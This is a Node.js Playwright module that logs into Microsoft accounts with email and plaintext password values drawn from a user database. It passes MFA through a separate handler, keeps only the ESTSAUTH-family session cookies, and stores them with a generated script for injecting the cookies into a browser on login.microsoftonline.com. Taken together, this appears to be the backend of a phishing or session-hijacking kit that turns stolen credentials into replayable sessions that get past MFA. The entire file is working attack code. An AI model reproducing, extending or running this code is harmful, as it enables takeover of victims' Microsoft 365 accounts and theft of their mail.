const { chromium, firefox, webkit } = require('playwright');
const User = require('../models/user');
const { handleMicrosoftMFA } = require('./mfa-handler');
const { generateCookieInjector } = require('./cookie-generator');

// Capture cookies using Playwright with real login credentials
async function captureOutlookCookiesPlaywright(userId, accessToken) {
  let browser;
  try {
    // Get user credentials from database
    const user = await User.findById(userId);
    if (!user || !user.email || !user.password) {
      console.log('No credentials found for user');
      return [];
    }
    
    browser = await chromium.launch({ 
      headless: false,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const context = await browser.newContext();
    await context.clearCookies(); // Clear any existing sessions
    let page = await context.newPage();
    
    // Use Microsoft Account client ID that generates ESTSAUTH cookies
    await page.goto('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&response_type=code&prompt=login&client_info=1&x-client-SKU=MSAL.Desktop&x-client-Ver=4.66.1.0', {
      waitUntil: 'domcontentloaded',
      timeout: 60000
    });
    
    // Enter email
    await page.fill('input[type="email"]', user.email);
    await page.click('input[type="submit"]');
    await page.waitForTimeout(2000);
    
    // Enter password
    await page.fill('input[type="password"]', user.password);
    await page.click('input[type="submit"]');
    await page.waitForTimeout(5000);
    
    // Handle MFA with enhanced number matching support
    const mfaResult = await handleMicrosoftMFA(page, userId, browser);
    if (mfaResult && mfaResult.page) {
      // Use the page returned from MFA handler
      page = mfaResult.page;
      if (mfaResult.browser) {
        browser = mfaResult.browser;
      }
    }
    
    // Verify browser is still open
    if (browser && !browser.isConnected()) {
      console.log('Browser was closed, cannot continue');
      return [];
    }
    
    // Handle "Stay signed in?" prompt
    try {
      await page.click('input[value="Yes"]', { timeout: 10000 });
      await page.waitForTimeout(3000);
    } catch (e) {
      console.log('No stay signed in prompt');
    }
    
    // Additional wait for cookies to be set
    await page.waitForTimeout(5000);
    
    // Visit Outlook to trigger additional enterprise cookies
    try {
      await page.goto('https://outlook.office.com', {
        waitUntil: 'domcontentloaded',
        timeout: 30000
      });
      await page.waitForTimeout(8000);
    } catch (e) {
      console.log('Outlook visit failed, continuing with captured cookies...');
    }
    
    // Get all cookies
    const allCookies = await page.context().cookies();
    
    // Filter for ONLY essential Microsoft login cookies (like working set)
    const essentialCookieNames = [
      'stsservicecookie',
      'x-ms-gateway-slice', 
      'fpc',
      'esctx',
      'buid',
      'ESTSAUTHLIGHT',
      'ESTSAUTH',
      'ESTSAUTHPERSISTENT'
    ];
    
    const essentialCookies = allCookies.filter(cookie => {
      // Only keep cookies from Microsoft login domains
      const isMicrosoftDomain = cookie.domain.includes('login.microsoftonline.com') ||
                               cookie.domain.includes('.login.microsoftonline.com');
      
      // Only keep essential cookie names or esctx variants
      const isEssentialCookie = essentialCookieNames.includes(cookie.name) ||
                               cookie.name.startsWith('esctx-');
      
      return isMicrosoftDomain && isEssentialCookie;
    });
    
    // Log filtered cookies
    console.log(`\n🎯 FILTERED TO ${essentialCookies.length} ESSENTIAL COOKIES:`);
    essentialCookies.forEach((cookie, index) => {
      console.log(`${index + 1}. ${cookie.name}: ${cookie.value.substring(0, 50)}...`);
      console.log(`   Domain: ${cookie.domain} | HttpOnly: ${cookie.httpOnly}\n`);
    });
    
    // Use filtered cookies instead of all cookies
    const authCookies = essentialCookies;
    
    // Convert to exact format matching working script
    const formattedCookies = authCookies.map(cookie => ({
      domain: cookie.domain,
      httpOnly: cookie.httpOnly,
      path: cookie.path,
      secure: cookie.secure,
      expiry: cookie.expires ? Math.floor(new Date(cookie.expires).getTime() / 1000) : 0,
      name: cookie.name,
      value: cookie.value
    }));
    
    // Save to database with injector script
    const injectorScript = generateCookieInjector(formattedCookies);
    
    await User.findByIdAndUpdate(userId, {
      sessionCookies: formattedCookies,
      allCookies: formattedCookies,
      injectorScript: injectorScript,
      cookieStatus: "session_captured",
      isActive: true,
      lastLogin: new Date()
    });
    
    console.log(`\n📋 GENERATED COOKIE INJECTOR SCRIPT (${formattedCookies.length} cookies)`);
    console.log('🔗 Use this script on login.microsoftonline.com to inject cookies\n');
    
    console.log(`\n🎭 PLAYWRIGHT CAPTURED ${authCookies.length} ESSENTIAL COOKIES:`);
    authCookies.forEach(cookie => {
      console.log(`🍪 ${cookie.name}: ${cookie.value.substring(0, 50)}...`);
      console.log(`   Domain: ${cookie.domain} | HttpOnly: ${cookie.httpOnly}\n`);
    });
    
    await browser.close();
    return authCookies;
  } catch (error) {
    console.error('Playwright capture error:', error.message);
    if (browser) await browser.close();
    return [];
  }
}

module.exports = { captureOutlookCookiesPlaywright };